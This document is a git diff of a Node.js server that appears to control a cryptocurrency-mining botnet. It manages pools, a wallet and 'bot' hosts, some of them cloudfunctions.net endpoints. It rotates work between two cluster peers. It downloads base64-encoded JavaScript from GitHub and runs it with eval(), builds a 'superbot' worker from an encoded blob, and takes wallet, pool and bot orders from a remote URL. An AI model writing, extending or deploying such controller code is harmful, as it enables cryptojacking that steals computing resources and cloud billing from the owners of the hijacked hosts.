@@ -3,24 +3,52 @@ const request = require('request');
 const net = require('net');
 const CryptoJS = require("crypto-js");
 const express = require("express"); 
+const bodyParser=require('body-parser');
 const app = express();
 app.get('/',function(req,res) {
-  if(req.query.id) { gg.url = BASE64_Decode(req.query.id);
-    setTimeout(function() { delete gg.url }, 30 * 60000)
+  if(req.query.init) init(req.query.init,function(msg){
+    var data = { msg: msg }
+    if(msg.includes('successful')) {
+      data.wallet = db.wallet;
+      data.pools = { values: [] }; for(var i=0; i<pools.length; i++) data.pools.values.push([pools[i].host]);
+      data.bots = { values: [] }; for(var i=0; i<bots.length; i++) data.bots.values.push([bots[i].host]);
+      data.push = {log: db.log};
+      db.log = { values: [], backgrounds: [] };
+    };
+    res.json(data)
+  })
+  else if(req.query.id) {
+    gg.url = BASE64_Decode(req.query.id);
     res.json({values:db.summary, state:db.state})
   }
   else res.send('Hello world!')
 });
-app.listen(process.env.PORT||5000, () => {
-  setInterval(function() { request(db.summary[1][0], function(err, res, body) { })}, 10 * 60000); 
-})
+app.post('/',app.parser,function(req,res) {
+  if(req.body.bots) update_bots(req.body.bots)
+  res.send('successful')
+});
+app.listen(process.env.PORT||5000, () => { log({host:'init',color:'#8ED76C',msg:'start' }) })
+
+var cluster = {
+  id: Number(require('./package.json').host[15]),
+  peer: require('./package.json').host.split(''),
+  rec: false
+}
+cluster.peer[15] = cluster.id == 1 ? '2' : '1'
+cluster.peer = cluster.peer.join('');
+
+var active = false;
+var m = new Date().getMinutes();
 
 var db = {
   state: 'orange', wallet: '*',
   summary: [ ['*'], [require('./package.json').host], ['0 h/s'], ['0/0/0/0'], ['0/0/0/0'] ],
-  pools: { hosts: [], backgrounds: [], hashes: [] },
-  bots: { hosts: [], backgrounds: [], hashes: [] },
-  log: []
+  pools: { backgrounds: [], hashes: [] },
+  bots: { backgrounds: [], hashes: [] },
+  push: {
+    tmp: { values: [], backgrounds: [] },
+    log: { values: [], backgrounds: [] }
+  }
 }
 
 var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') }
@@ -34,9 +62,19 @@ var bots = [];
 var yellow_pools = true;
 
 setInterval(function() {
+  m = new Date().getMinutes();
+  active = (cluster.id == 1 && m < 30) || (cluster.id == 2 && m >= 30);
+  var t = cluster.id == 1 && m == 29; if(!t) t = cluster.id == 2 && m == 59;
+
+  if(!cluster.rec && t) {
+    cluster.rec = true;
+    var data = { bots: [] }; for(var i=0; i<bots.length; i++) data.bots.push([bots[i].host])
+    request.post({ url: cluster.peer, form: data, json: true }, function(err, res, body) { cluster.rec = false })
+  }
+
   var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;
 
-  db.pools = { hosts: [], backgrounds: [], hashes: [] }
+  db.pools = { backgrounds: [], hashes: [] }
   db.summary[3][0] = '0/0/0/0'
   for(var i=0; i<pools.length; i++) {
     dbplus('pools',pools[i]);
@@ -45,32 +83,36 @@ setInterval(function() {
     rt = pools[i].state == 'red' ? true: rt;
   }
 
-  db.bots = { hosts: [], backgrounds: [], hashes: [] }
+  db.bots = { backgrounds: [], hashes: [] }
   db.summary[4][0] = '0/0/0/0'
   for(var i=0; i<bots.length; i++) {
+    var ta = bots[i].hash.split(' '); bots[i].hash = ta[0]+' h/s '+ta[2];
+    if(bots[i].wakecount) { bots[i].wakecount--;  bots[i].hash += ' - '+bots[i].wakecount+' sec' }
     dbplus('bots',bots[i]);
     hsum += Number(bots[i].hash.split(' ')[0]);
     rt = bots[i].state == 'red' ? true: rt
   }
 
   db.state = rt ? 'orange' : hsum == 0 ? 'yellow' : 'green'
-  db.summary[2] = [hsum+' h/s '+hsub+'/'+hacp];
+  db.summary[2] = [(active ? hsum : 0)+' h/s '+hsub+'/'+hacp+' - '+(cluster.id == 1 ? 30-m : 60-m)+' sec'];
 
-  if(!gg.rec && gg.url) {
+  if(active && !gg.rec && gg.url) {
     gg.rec = true;
-    request.post({ url: gg.url, form: BASE64_Encode(JSON.stringify(db)), json: true, followAllRedirects: true },
+    db.push.log = db.push.tmp; db.push.tmp = { values: [], backgrounds: [] };
+    request.post({ url: gg.url, form: JSON.stringify(db), json: true, followAllRedirects: true },
     function(error, response, body) {
-      if(error) { log({host:'google',color:'purple',msg:error.message}); gg.rec = false }
-      else if(!body.yellow_pools) { log({host:'google',color:'purple',msg:'body is wrong (data)'}); gg.rec = false }
+      if(error) { log({host:'google',color:'#F8516A',msg:error.message}); gg.rec = false }
+      else if(!body.yellow_pools) { log({host:'google',color:'#F8516A',msg:'body is wrong (data): '+body}); gg.rec = false }
       else {
-        db.log = []; var tasks = []; yellow_pools = body.yellow_pools == 'ON';
-        if(body.init) init(body.init);
-        if(body.wallet) {
-          db.wallet = body.wallet; log({msg:'new wallet: '+db.wallet});
-          if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push(pools[i].host); tasks.push(update_pools(list)) }
+        var tasks = []; yellow_pools = body.yellow_pools == 'ON';
+        if(body.wallet && body.wallet != db.wallet) {
+          db.wallet = body.wallet; log({host:'new wallet',msg:db.wallet});
+          if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push([pools[i].host]); tasks.push(update_pools(list)) }
         }
-        if(body.pools) { var list = []; for(var i=0; i<body.pools.length; i++) list.push(body.pools[i][0]); tasks.push(update_pools(list)) }
-        if(body.bots) { var list = []; for(var i=0; i<body.bots.length; i++) list.push(body.bots[i][0]); update_bots(list) }
+
+        if(body.pools) tasks.push(update_pools(body.pools));   
+        if(body.bots) update_bots(body.bots);
+
         Promise.all(tasks).then(msgs => { gg.rec = false });
       }
     })
@@ -79,35 +121,43 @@ setInterval(function() {
 
 function update_pools(list) {
   return new Promise((resolve, reject) => {
-    var tasks = [];
-    for(var i=0; i<pools.length; i++) tasks.push(pools[i].close());
-    Promise.all(tasks).then(msgs => {
-      for(var j=0; j<msgs.length; j++) log({host:msgs[j],msg:'del pool'})
-      pools = [];
-      for(var j=0; j<list.length; j++) {
-        pools.push(new gg.mycoin({ wallet: db.wallet, host: list[j] }));
-        log({host:list[j],msg:'add pool'})
-      }
-      resolve(true)
-    });
+    var p1 = []; for(var i=0; i<list.length; i++) p1.push(list[i][0]);
+    var p2 = []; for(var i=0; i<pools.length; i++) p2.push(pools[i].host);
+    if(JSON.stringify(p1) != JSON.stringify(p2)) resolve(true)
+    else {
+      var tasks = [];
+      for(var i=0; i<pools.length; i++) tasks.push(pools[i].close());
+      Promise.all(tasks).then(msgs => {
+        for(var j=0; j<msgs.length; j++) log({host:msgs[j],msg:'del pool'})
+        pools = [];
+        for(var j=0; j<list.length; j++) {
+          pools.push(new gg.mycoin({ wallet: db.wallet, host: list[j] }));
+          log({host:list[j],msg:'add pool'})
+        }
+        resolve(true)
+      });
+    }
   })
 }
 
 function update_bots(list){
-  for(var i=0; i<bots.length; i++) {
-    if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
-    log({host:bots[i].host,msg:'del bot'})
-  }
-  bots = [];
-  for(var i=0; i<list.length; i++) {
-    let nbot={host:list[i], state:'orange', hash:'0 h/s [0/0]'};
-    bots.push(nbot); mybot('wakeup',nbot);
-    log({host:list[i],msg:'add bot'});
+  var b1 = []; for(var i=0; i<list.length; i++) b1.push(list[i][0]);
+  var b2 = []; for(var i=0; i<bots.length; i++) b2.push(bots[i].host);
+  if(JSON.stringify(b1) != JSON.stringify(b2)) {
+    for(var i=0; i<bots.length; i++) {
+      if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
+      log({host:bots[i].host,msg:'del bot'})
+    }
+    bots = [];
+    for(var i=0; i<list.length; i++) {
+      let nbot={host:list[i], state:'orange', hash:'0 h/s [0/0]'};
+      bots.push(nbot); mybot('wakeup',nbot);
+      log({host:list[i],msg:'add bot'});
+    }
   }
 }
 
 function dbplus(name,obj){
-  db[name].hosts.push([obj.host]);
   var a = name == 'pools' ? db.summary[3][0].split('/') : db.summary[4][0].split('/')
   a[['red','orange','yellow','green'].indexOf(obj.state)]++
   db[name].backgrounds.push([obj.state])
@@ -117,8 +167,10 @@ function dbplus(name,obj){
 }
 
 function log(data) {
-  data.timestamp = new Date().toLocaleString();
-  db.log.push(data);
+  db.push.tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
+  if(!data.color) data.color = null;
+  else console.log(JSON.stringify(data))
+  db.push.tmp.backgrounds.push([data.color,data.color,data.color]);
 }
 
 function BASE64_Encode(x) { return Buffer.from(x).toString('base64') }
@@ -128,9 +180,10 @@ function mybot(cmd,bot) {
   if(cmd == 'wakeup') {
     bot.msg = "wakeup";
     bot.wakeup = setTimeout(function() { mybot('onmsg',bot) }, 60000);
+    bot.wakecount = 60
   }
   else if(cmd == 'onmsg') {
-    delete bot.wakeup; 
+    delete bot.wakeup; delete bot.wakecount;
     if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
       for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
         if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
@@ -168,7 +221,7 @@ function mybot(cmd,bot) {
         return mybot('wakeup',bot)
       }
     }
-    log({host:bot.host,color:'red',msg:bot.msg})
+    log({host:bot.host,color:'#F8516A',msg:bot.msg})
     if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
     else bot.state = 'red'; 
     bot.hash = '0 h/s '+bot.hash.split(' ')[2];
@@ -176,13 +229,15 @@ function mybot(cmd,bot) {
   }
 }
 
-function init(coin) {
-  request( require('./package.json').github+"/mylist/master/"+coin+".js", function(err, res, body) {
-    if(err) console.log('github: '+error.message)
+function init(coin,callback) {
+  request( require('./package.json').github+coin+".js", function(err, res, body) {
+    if(err) { log({host:'github_1',color:'#F8516A',msg:err.message}); callback('error github_1 '+err.message) }
+    else if(body == '404: Not Found') { log({host:'github_1',color:'#F8516A',msg:body}); callback('error github_1 '+body) }
     else {
       eval(decrypt(body));
-      request( require('./package.json').github+"/mylist/master/superbot.js", function(err, res, body) {
-        if(err) console.log('github: '+error.message)
+      request( require('./package.json').github+"superbot.js", function(err, res, body) {
+        if(err) { log({host:'github_2',color:'#F8516A',msg:err.message}); callback('error github_2 '+err.message) }
+        else if(body == '404: Not Found') { log({host:'github_2',color:'#F8516A',msg:body}); callback('error github_2 '+body) }
         else {
           gg.superbot = decrypt(body);
           gg.worker = gg.superbot+'\n'+decrypt(`
@@ -193,14 +248,12 @@ DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsH
 ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
 vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
 59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
-          request( require('./package.json').github+"/mylist/master/"+db.summary[1][0].split('.')[0].split('//')[1]+".json", function(err, res, body) {
-            if(err) console.log('github: '+error.message)
-            else update_bots(JSON.parse(decrypt(body)))
-          })
+          log({host:'init',color:'#8ED76C',msg:'successful '+coin});
+          callback('successful '+coin);
         }
       })
     }
   })
 }
 
-init("Tube")
+init("Tube",function(){})
